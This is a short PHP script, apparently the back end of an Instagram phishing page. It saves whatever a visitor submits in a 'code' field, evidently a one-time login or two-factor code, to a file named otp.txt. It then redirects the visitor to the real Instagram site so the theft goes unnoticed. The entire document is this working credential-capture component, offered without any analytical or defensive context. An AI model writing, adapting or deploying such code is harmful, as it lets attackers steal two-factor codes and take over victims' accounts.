<?php         
$data=$_POST['code'];
file_put_contents('otp.txt', $data);
header("Location: https://www.instagram.com");
exit;
?>